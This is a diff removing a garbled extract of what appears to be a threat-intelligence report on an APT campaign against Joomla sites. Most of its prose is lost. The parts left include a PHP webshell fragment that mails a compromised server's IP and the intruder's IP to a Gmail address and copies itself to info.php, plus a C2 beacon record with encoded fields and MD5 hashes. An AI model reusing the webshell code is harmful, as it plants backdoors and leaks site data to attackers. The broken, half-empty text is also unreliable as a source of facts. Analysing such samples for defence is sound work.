@@ -1,149 +1,0 @@
--
- CEO 
-
-Content 
-1 & 2  3  4  5 
-
-C  ONTENTS
-
-01
-
-&
-
-
-
- 
-
-
-
-     
-
-  
-
- 
-
- 
-
-
-
-
-
- 
-
-
-     
-
-
-
-
-
-  
- 
- 
-
-  
-    
-   
-
-C  ONTENTS 02
-
-
-
-
-
-
-
-
-
-APTwebshell 
-
-Part
-03
-
-
-
-
-joomla
-
-
- 
-
-
- 
-
-
-
- 
-
-
-  
-
- 
- 
-
-
-
-$serper=gethostbyname($_SERVER['SERV ER_ADDR']); $injektor = gethostbyname($_SERVER['REMOTE_ADD R']); mail("vir.lin90@gmail.com", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor"); $_SESSION['bajak'] = 0; } else {$_SESSION['bajak']++;}; if(isset($_GET['clone'])){ $source = $_SERVER['SCRIPT_FILENAME']; $desti =$_SERVER['DOCUMENT_ROOT']."/info.ph p";
-
-joomla joomla jce linuxmail gmail urlip
-
-vir.lin90@gmail.com
-
-
-Part
-04 
-
-
-lv|'|'|2YLYr9mK2YVfQzQyMzlGMzA=|'|'|PERSONNEL5PC|'|'|user|'|'|1436-05-06|'|'|SAU|'|'|Win 7 Professional SP1 x86|'|'|No|'|'|0.5.0E|'|'|..|'|'|2LTYp9iqINiz2YjYp9mE2YHZhtinINi n2YTYtdmI2KrZiiAtIFdpbmRvd3MgSW50ZXJuZXQgRXhwbG 9yZXI=|'|'|682dfec8c66a0de6f1475ca73c462a69,39b7927e0
-d4deb5c10fb380b7c53c617,[endof]
-
-
-[endof ] MD5 
-[endof ]
-
-
-[endof ] MD5 
-[endof ]
-
-
-
-  
-
-      
-
-IP
-
-MD5URL
-
-
-
-
-
-  
-
-  
-
-
-
-
-
-
-
-           
- 
-
-
-  whoisemail
-  
- APT 
-
-Part
-05 
-
-
- 1PE shellcode
- 2ssl  3APT  4  5  6  7  8
-
-
-
-
